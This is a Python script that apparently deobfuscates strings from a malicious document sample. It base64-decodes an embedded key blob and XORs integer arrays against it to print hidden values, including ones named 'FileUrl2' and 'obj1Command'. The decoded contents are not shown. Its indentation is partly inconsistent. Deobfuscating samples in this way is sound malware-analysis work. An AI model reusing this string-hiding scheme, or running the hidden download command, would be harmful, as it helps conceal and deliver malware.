Barray64 = []
for i in range(ord('A'), ord('Z')+1):
    Barray64.append(i)
for i in range(ord('a'), ord('z')+1):
    Barray64.append(i)
for i in range(ord('0'), ord('9')+1):
    Barray64.append(i)
Barray64.append(ord('+'))
Barray64.append(ord('/'))

Barray128 = [255 for i in range(128)]
print("Barray64: ")
print(Barray64)
print("")
for i in range(len(Barray64)):
    Barray128[Barray64[i]]=i
print("Barray128: ")
print(Barray128)

docVar = "c/blrFFGzJwUDWpdVBM1WO9xExkjgIB9euvb5lcOj3GFDrrKs8VGpDOyfPrp2W+tdIdIxKWVMM81wTkH2Z9unLFgc84o3/FnchOXx/GEr/bJwZW4yNYzXM0NxfmN6h+i+8lIdnPDw/y99zpDvDTK1Rvkc9O0NMCd5NOyBlLNYv2/oBJf/pk1i/ywXqz6SD+Ed4Zv+YiufwJJ2V412ghirofXNRg6HuC8oL/m7KO1Baapnn6VwCYqqtQfvBCgTy7H1aV9av5p//lHil1/JUO7blGt502yy9FBSiuqu5n+YN7rZMfPbhDYkU6EaaZ9xSRnmH5LmIf5wkQ4sImEfBeS966EKhnyxALH2FDISSEQQYpjdJb50BCoJosACu2xHyyfmXRrYBDbjXcQpk36v6HRXExJ/1Ub07jxnY2UXWxZm0+DmgaA81Hnpi02YexVWjdGN2iMJx6Wp3HK9xjPTuE8e7RRmnM=".encode("utf-16")
lendiv2 = len(docVar) // 2

asciiDocVar = []

for i in range(lendiv2):
	print(str(docVar[2*i])+ ", " + str(256 * docVar[2*i + 1]))
	intCharVar = docVar[2*i] + 256 * docVar[2*i + 1]
	if intCharVar >=256:
		intCharVar = ord("?")
	asciiDocVar.append(intCharVar)
asciiDocVar=asciiDocVar[1:]
asciiDocRead = ""
for i in asciiDocVar:
	asciiDocRead += chr(i)
print(asciiDocRead)

asciiLen = len(asciiDocVar)
while asciiLen > 0:
	if asciiDocVar[asciiLen-1] != ord("="):
		break
	asciiLen -=1

thrQutrLen = (asciiLen *3)//4
thrQutrArr = []
print(len(thrQutrArr))
print(thrQutrLen)
long1=0
long2=0
while long1 < asciiLen:
	byte1 = asciiDocVar[long1]
	long1+=1
	byte2=asciiDocVar[long1]
	long1+=1
	if long1<asciiLen:
		byte3orA=asciiDocVar[long1]
		long1+=1
	else:
		byte3orA=ord("A")
	if long1<asciiLen:
		byte4orA=asciiDocVar[long1]
		long1+=1
	else:
		byte4orA=ord("A")
	
	print(byte1,byte2,byte3orA,byte4orA)
	if byte1 > 127 or byte2 > 127 or byte3orA > 127 or byte4orA > 127:
		print("Error1")
		break
	
	byte1B64Indx = Barray128[byte1]
	byte2B64Indx = Barray128[byte2]
	byte3B64Indx = Barray128[byte3orA]
	byte4B64Indx = Barray128[byte4orA]
	print(byte1B64Indx,byte2B64Indx,byte3B64Indx,byte4B64Indx)
	if byte1B64Indx > 63 or byte2B64Indx > 63 or byte3B64Indx > 63 or byte4B64Indx > 63:
		print("Error2")
		break
	
	byte12Or = (byte1B64Indx * 4) | (byte2B64Indx // 0x10)
	byte23Or = ((byte2B64Indx & 0xF) * 0x10) | (byte3B64Indx // 4)
	byte34Or = ((byte3B64Indx & 3) * 0x40) | byte4B64Indx
	print(long2)
	thrQutrArr.append(byte12Or)
	long2+=1

	if long2 < thrQutrLen:
		 thrQutrArr.append(byte23Or)
		 long2 = long2 + 1
	if long2 < thrQutrLen:
         thrQutrArr.append(byte34Or) 
         long2 = long2 + 1
print(thrQutrLen)
print(thrQutrArr)


def arrToStr(arrInput, thrQutrOffset):
	strRet = ""
	for i in range(len(arrInput)):
		strRet = strRet + chr(thrQutrArr[i+thrQutrOffset] ^ arrInput[i])
	return strRet

string1 = arrToStr([27, 130, 145, 220, 107, 105, 227, 173, 36, 35, 90, 115], 0) + arrToStr([102, 61, 1, 98, 215, 65, 35, 41, 12, 237, 243, 73, 79, 220, 245, 131, 47, 107], 12)
FileUrl2 = arrToStr([231, 5, 241, 126, 128], 30) + arrToStr([229, 156, 244, 118, 138, 3, 156, 78, 212, 221, 227, 87, 157, 68, 183, 103, 245, 151, 164, 5, 253, 5, 243, 8, 88, 232, 168, 49, 169, 136, 63, 70, 252, 6, 175, 130, 86], 35)
obj1Command = arrToStr([63], 72) + arrToStr([122, 244, 181, 158, 247, 192, 144, 189, 239, 205, 245, 132, 158, 103, 8, 157], 73)
print(string1)
print(FileUrl2)
print(obj1Command)
print(arrToStr([74, 128, 173], 89))
print(arrToStr([204, 174], 92) + arrToStr([80, 230, 185, 231, 27, 2, 1, 166, 162, 145], 94))
print(arrToStr([254, 205, 102, 31, 235, 93, 164, 177, 116, 147, 0, 143, 232, 96], 104) + arrToStr([165, 240, 148, 143, 238, 107, 33, 249, 87, 202, 145, 197, 106, 58], 118))
print(arrToStr([179, 240, 86, 249, 147, 195, 49, 202, 142, 102, 103, 201, 59, 206], 132) + arrToStr([59, 173, 216], 146))
print(arrToStr([233, 58, 86], 149))
print(arrToStr([8, 157, 17, 113, 152, 38], 152) + arrToStr([49, 218, 245, 178, 84, 117], 158))
print(arrToStr([121, 36, 188, 224, 247, 214], 164) + arrToStr([136, 136, 204, 194, 118, 250, 245, 202, 27, 248, 176, 122, 118, 155, 230, 46, 137, 34, 144, 125, 31, 152, 228, 146, 34, 95, 199, 54, 202, 203, 105, 250, 46, 78], 170))
print(arrToStr([117, 44, 204, 11, 35, 222, 143, 40, 222, 167, 241, 108, 12, 66, 198, 222, 185, 220, 66, 157, 209, 56, 155, 152, 7], 204) + arrToStr([126, 188, 254, 57, 247, 53, 250, 41, 160, 73, 23, 196, 34, 122, 170, 182, 204, 240, 116, 10, 129, 214, 181, 75, 72, 167, 206, 241, 177, 24, 55, 130, 183, 51], 229))
print(arrToStr([144, 139, 51, 186, 32, 81, 100, 111, 217, 11, 17, 250], 263) + arrToStr([149], 275))
print(arrToStr([149, 98, 218, 73, 249, 32, 48, 205, 229, 119, 69, 236, 185], 276) + arrToStr([16, 4, 3, 101, 182, 232, 25, 100, 134, 36, 137, 159, 194, 190, 46, 62, 60, 143, 33, 126, 183], 289))
print(arrToStr([253, 131, 239, 226, 230, 125, 86, 121, 207, 39, 234, 233, 38, 228, 156, 50, 146, 203, 72, 88, 21, 204, 56, 59, 78, 102, 89, 7], 310) + arrToStr([248, 7, 125, 249, 201, 5, 171, 158, 118, 239, 47, 141, 80, 91, 208, 48, 238, 18], 338))
